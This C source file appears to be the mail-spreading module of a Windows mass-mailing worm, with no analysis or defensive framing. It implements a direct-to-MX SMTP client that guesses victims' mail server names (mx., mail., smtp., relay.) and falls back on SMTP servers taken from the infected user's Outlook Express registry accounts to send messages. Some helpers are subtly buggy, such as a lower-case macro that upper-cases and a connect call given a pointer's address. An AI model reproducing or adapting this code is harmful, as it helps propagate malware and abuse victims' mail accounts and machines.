#include "includes.h"
#include "functions.h"
#include "externs.h"

//#define WIN32_LEAN_AND_MEAN
//#include <windows.h>
//#include <winsock2.h>
//#include "lib.h"
//#include "xdns.h"
//#include "massmail.h"
//#pragma comment(lib, "ws2_32.lib")
//#pragma comment(lib, "user32.lib")

#define my_tolower(c) (((c) >= 'a' && (c) <= 'z') ? ((c)-'a'+'A') : (c));
#define my_isdigit(c) ((c) >= '0' && (c) <= '9')
#define my_isalpha(c) (((c) >= 'a' && (c) <= 'z') || ((c) >= 'A' && (c) <= 'Z'))
#define my_isalnum(c) (my_isdigit(c) || my_isalpha(c))

int recvline(SOCKET s, char *buf, int size, unsigned long timeout)
{
	int i, t;
	for (i=0; (i+1)<size;) {
		if (timeout != 0) {
			fd_set fds;
			struct timeval tv;
			FD_ZERO(&fds);
			FD_SET(s, &fds);
			tv.tv_sec = timeout / 1000;
			tv.tv_usec = (timeout % 1000) * 1000;
			if (fselect(0, &fds, NULL, NULL, &tv) <= 0)
				break;
		}
		t = frecv(s, buf+i, 1, 0);
		if (t < 0) return -1;
		if (t == 0) break;
		if (buf[i++] == '\n') break;
	}
	buf[i] = 0;
	return i;
}

unsigned long my_atou_x(char *s)
{
	unsigned radix=10, c;
	unsigned long n=0;

	while (*s == ' ' || *s == '\t') s++;

	if (s[0] == '0' && s[1] == 'x') {
		radix = 16;
		s += 2;
	}

	while (my_isalnum(*s)) {
		c = my_tolower(*s); s++;
		if (my_isdigit(c)) c=c-'0'; else c=c-'A'+10;
		if (c >= radix) break;
		n = n * radix + c;
	}

	return n;
}

int my_atoi(char *s)
{
	int n=0;
	while (*s == ' ' || *s == '\t') s++;
	while (my_isalnum(*s))
		n = n * 10 + (*s++ - '0');
	return n;
}

int mail_extracthdr(char *headers, char *name, char *buf, int bufsize)
{
	char *p = headers, *q;
	char hdrname[256];
	int i;

	if (headers == NULL || name == NULL || buf == NULL || bufsize <= 0) return 1;
	while (*p == '\r' || *p == '\n' || *p == ' ' || *p == '\t') p++;

	while (*p) {
		for (i=0; i<(sizeof(hdrname)-1);) {
			char c = *p++;
			if (c == 0) break;
			if (c == ':' || c == '\r' || c == '\n') { p--; break; }
			if (c == '\t') c=' ';
			if (i>0 && c==' ') { if(hdrname[i-1]==' ') continue; }
			if (i==0 && c==' ') continue;
			hdrname[i++] = c;
		}
		hdrname[i] = 0;

		if (*p == 0) break;

		if (hdrname[lstrlen(hdrname)-1] == ' ') hdrname[lstrlen(hdrname)-1] = 0;
		if (hdrname[0] == 0) break;

		if (*p == ':') {
			CharLower(hdrname);
			if (lstrcmpi(hdrname, name) == 0) {
				p++;
				goto hdr_found;
			}
		}

		while (*p != '\n' && *p != '\r' && *p) p++;
		if (*p == 0) break;

		if (*p == '\n') {
			p++;
			if (*p == '\r') p++;
		} else if (*p == '\r') {
			p++;
			if (*p == '\n') p++;
		}
		if (*p == '\n' || *p == '\r') break;
	}

	return 1;

hdr_found:
	if (*p == ' ' || *p == '\t') p++;
	for (i=0; i<(bufsize-1);) {
		char c = *p++;
		if (c == '\r' || c == '\n') {
			q = p--;
			while (*q == '\n' || *q == '\r') q++;
			if (*q != ' ' && *q != '\t') break;

			while (*p == '\n' || *p == '\r') p++;
			continue;
		}
		buf[i++] = c;
	}
	buf[i] = 0;
	return 0;
}

int wait_sockread(SOCKET sock, unsigned long timeout)
{
	struct timeval tv;
	fd_set fds;

	tv.tv_sec = timeout / 1000;
	tv.tv_usec = (timeout % 1000) * 1000;
	FD_ZERO(&fds);
	FD_SET(sock, &fds);
	return (fselect(0, &fds, NULL, NULL, &tv) <= 0) ? 1 : 0;
}

int smtp_issue(SOCKET sock, int timeout, LPCTSTR lpFormat, ...)
{
	char buf[1024], *p;
	int code;

	if (lpFormat != NULL) {
		va_list arglist;
		va_start(arglist, lpFormat);
		wvsprintf(buf, lpFormat, arglist);
		va_end(arglist);
		fsend(sock, buf, lstrlen(buf), 0);
	}

	while (1) {
		if (recvline(sock, buf, sizeof(buf), timeout) <= 0) return 0;
		for (p=buf, code=0; *p == ' ' || *p == '\t'; p++);
		while (*p >= '0' && *p <= '9') code = code * 10 + *p++ - '0';
		if (*p == '-') continue;
		break;
	}

	return code;
}

int smtp_send_server(struct sockaddr_in *addr, char *message)
{
	char from[256], from_domain[256], rcpt[256], *p, *q;
	int stat;
	SOCKET sock;

	if (mail_extracthdr(message, "From", from, sizeof(from))) return 1;
	if (mail_extracthdr(message, "To", rcpt, sizeof(rcpt))) return 1;
	for (p=from; *p && *p != '@'; p++);
	if (*p == 0) return 1;
	lstrcpy(from_domain, p+1);

	sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) return 1;
	if (fconnect(sock, (LPSOCKADDR)&addr, sizeof(addr)))
		goto err;

	if (wait_sockread(sock, 15000)) goto err;
	stat = smtp_issue(sock, 15000, NULL);
	if (stat < 200 || stat >= 400) goto err;

	stat = smtp_issue(sock, 10000, "EHLO %s\r\n", from_domain);
	if (stat < 200 || stat > 299) {
		stat = smtp_issue(sock, 10000, "HELO %s\r\n", from_domain);
		if (stat < 200 || stat > 299) goto err;
	}

	stat = smtp_issue(sock, 10000, "MAIL FROM:<%s>\r\n", from);
	if (stat < 200 || stat > 299) goto err;
	stat = smtp_issue(sock, 10000, "RCPT TO:<%s>\r\n", rcpt);
	if (stat < 200 || stat > 299) goto err;

	stat = smtp_issue(sock, 10000, "DATA\r\n");
	if (stat < 200 || stat > 399) goto err;

	for (p=message;;) {
		for (q=p; *q && *q != '\n' && *q != '\r'; q++);
		while (*q == '\n' || *q == '\r') q++;
		if (p == q) break;

		if (*p == '.') fsend(sock, ".", 1, 0);
		if (fsend(sock, p, q-p, 0) <= 0) goto err;
		p = q;
	}

	fsend(sock, "\r\n.\r\n", 5, 0);

	stat = smtp_issue(sock, 15000, NULL);
	if (stat < 200 || stat >= 400) goto err;

	smtp_issue(sock, 5000, "QUIT\r\n");

	fclosesocket(sock);
	return 0;

err:	fclosesocket(sock);
	return 1;
}

//-----------------------------------------------------------------------------

BOOL smtp_try_isp(char *message)
{
	SOCKADDR_IN addr;
	char name[256];
	BYTE szDataBuf[256];
	DWORD indx, dwSize;
	HKEY hKey1, hKey2;
	BOOL success;

	if (fRegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Account Manager\\Accounts", 0, KEY_READ, &hKey1) != 0)
		return 1;
	indx = 0;
	success = FALSE;
	while (fRegEnumKey(hKey1, indx++, name, sizeof(name)) == ERROR_SUCCESS && (!success)) {
		if (fRegOpenKeyEx(hKey1, name, 0, KEY_READ, &hKey2) != ERROR_SUCCESS)
			continue;
		dwSize = 256;
		if (fRegQueryValueEx(hKey2, (LPCTSTR)"SMTP Server", NULL, NULL, szDataBuf, &dwSize) == 0) {
			if ((addr.sin_addr.s_addr = ResolveAddress((char *)szDataBuf)) != 0) {
				addr.sin_family = AF_INET;
				addr.sin_port = fhtons((u_short)25);
				if (smtp_send_server(&addr, message) == 0)
					success = TRUE;
			}
		}
		fRegCloseKey(hKey2);

	}
	fRegCloseKey(hKey1);
	return success;
}

int smtp_send(struct mxlist_t *primary_mxs, char *message)
{
	struct sockaddr_in addr;
	char rcpt[256], rcpt_domain[256], *p, buf[256];
	struct mxlist_t *mxl;
	int i;

	if (message == NULL) return 1;

	if (mail_extracthdr(message, "To", rcpt, sizeof(rcpt))) return 1;
	for (p=rcpt; *p && *p != '@'; p++);
	if (*p == 0) return 1;
	lstrcpy(rcpt_domain, p+1);

	for (mxl=primary_mxs; mxl; mxl=mxl->next) {
		if ((addr.sin_addr.s_addr = ResolveAddress(mxl->mx)) == 0) continue;
		addr.sin_family = AF_INET;
		addr.sin_port = fhtons(25);
		if (smtp_send_server(&addr, message) == 0)
			return 0;
	}

	for (i=0;; i++) {
		switch(i) {
			case 0: lstrcpy(buf, rcpt_domain); break;
			case 1: wsprintf(buf, "mx.%s", rcpt_domain); break;
			case 2: wsprintf(buf, "mail.%s", rcpt_domain); break;
			case 3: wsprintf(buf, "smtp.%s", rcpt_domain); break;
			case 4: wsprintf(buf, "mx1.%s", rcpt_domain); break;
			case 5: wsprintf(buf, "mxs.%s", rcpt_domain); break;
			case 6: wsprintf(buf, "mail1.%s", rcpt_domain); break;
			case 7: wsprintf(buf, "relay.%s", rcpt_domain); break;
			case 8: wsprintf(buf, "ns.%s", rcpt_domain); break;
			case 9: wsprintf(buf, "gate.%s", rcpt_domain); break;
			default: buf[0] = 0; break;
		}
		if (buf[0] == 0) break;
		if ((addr.sin_addr.s_addr = ResolveAddress(buf)) == 0) continue;
		addr.sin_family = AF_INET;
		addr.sin_port = fhtons(25);
		if (smtp_send_server(&addr, message) == 0) return 0;

		if (randnum(100) < 20) break;
	}

	if (randnum(100) < 25)
		if (smtp_try_isp(message) == 0) return 0;

	return 1;
}